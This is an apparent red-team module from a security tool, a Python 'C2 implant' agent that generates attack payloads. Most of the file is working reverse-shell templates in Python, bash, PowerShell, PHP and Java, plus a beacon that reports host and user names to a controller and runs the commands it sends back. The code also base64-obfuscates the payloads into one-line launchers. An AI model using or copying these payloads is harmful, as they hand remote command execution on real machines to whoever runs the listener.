from __future__ import annotations

import base64
import logging
import random
import string

from bugfinder.agents.base import AgentContext, AgentResult, BaseAgent
from bugfinder.core.types import Confidence, Severity

logger = logging.getLogger(__name__)

PAYLOAD_TEMPLATES = {
    "python_reverse_shell": """import socket,subprocess,os,threading
def c2():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("{LHOST}",{LPORT}))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    import pty
    pty.spawn("sh")
threading.Thread(target=c2,daemon=True).start()
""",
    "bash_reverse_shell": """bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1""",
    "powershell_reverse": """$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
""",
    "php_reverse_shell": """php -r '$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");'""",
    "python_beacon": """import socket,json,time,subprocess,os,threading
C2_HOST="{LHOST}";C2_PORT={LPORT};BEACON_INTERVAL=60
def beacon():
    while True:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((C2_HOST,C2_PORT))
            s.send(json.dumps({{"host":os.uname()[1],"user":os.getenv("USER")}}).encode())
            resp=s.recv(4096)
            if resp:
                cmd=json.loads(resp.decode()).get("cmd","")
                out=subprocess.check_output(cmd,shell=True,stderr=subprocess.STDOUT).decode()
                s.send(json.dumps({{"output":out}}).encode())
            s.close()
        except:pass
        time.sleep(BEACON_INTERVAL)
threading.Thread(target=beacon,daemon=True).start()
""",
    "java_reverse_shell": """Runtime r = Runtime.getRuntime();
Process p = r.exec(new String[]{{"/bin/bash","-c","exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done"}});
p.waitFor();
""",
}

OBFUSCATION_METHODS = [
    "base64",
    "reverse_tcp",
    "http_beacon",
    "dns_tunnel",
    "websocket",
]


class C2ImplantAgent(BaseAgent):
    name = "redteam.c2_implant"
    description = "Generates C2 implant payloads for red team operations (reverse shells, beacons, bind shells)"
    category = "redteam"

    def __init__(self, context: AgentContext) -> None:
        super().__init__(context)

    async def execute(self) -> AgentResult:
        findings = []
        assets = []

        target = self.context.target

        lhost = self.context.config.get("c2_lhost", "127.0.0.1")
        lport = self.context.config.get("c2_lport", 4444)

        selected_payloads = self.context.config.get(
            "payloads",
            ["python_reverse_shell", "bash_reverse_shell", "powershell_reverse", "php_reverse_shell", "python_beacon"],
        )

        obfuscation = self.context.config.get("obfuscation", "base64")

        for name in selected_payloads:
            template = PAYLOAD_TEMPLATES.get(name)
            if not template:
                continue

            payload = template.replace("{LHOST}", lhost).replace("{LPORT}", str(lport))

            if obfuscation == "base64":
                encoded = base64.b64encode(payload.encode()).decode()
                if name.startswith("python"):
                    payload = f"python3 -c \"import base64;exec(base64.b64decode('{encoded}'))\""
                elif name.startswith("bash"):
                    payload = f"echo '{encoded}' | base64 -d | bash"
                elif name.startswith("powershell"):
                    payload = f"powershell -Enc {encoded}"

            rand_id = "".join(random.choices(string.hexdigits, k=8))
            finding = {
                "id": f"c2-{name}-{rand_id}",
                "title": f"C2 Implant: {name}",
                "description": f"C2 implant payload for {name} targeting {target}",
                "severity": Severity.CRITICAL.value,
                "confidence": Confidence.VERIFIED.value,
                "category": "redteam.c2_implant",
                "evidence": f"Generated {name} payload for LHOST={lhost}:{lport}",
                "remediation": "Monitor for unauthorized outbound connections and block C2 infrastructure",
                "payload": f"```\n{payload}\n```",
                "c2_config": {
                    "type": name,
                    "lhost": lhost,
                    "lport": lport,
                    "protocol": "tcp",
                    "obfuscation": obfuscation,
                },
            }
            findings.append(finding)

            assets.append(
                {
                    "id": f"c2-listener-{rand_id}",
                    "type": "c2_listener",
                    "host": lhost,
                    "port": lport,
                    "protocol": "tcp",
                    "purpose": f"C2 listener for {name}",
                }
            )

        return AgentResult(
            agent_name=self.name,
            status="completed",
            findings=findings,
            assets=assets,
            summary=f"Generated {len(findings)} C2 implant payloads targeting {lhost}:{lport}",
            data={"payload_count": len(findings), "lhost": lhost, "lport": lport},
        )
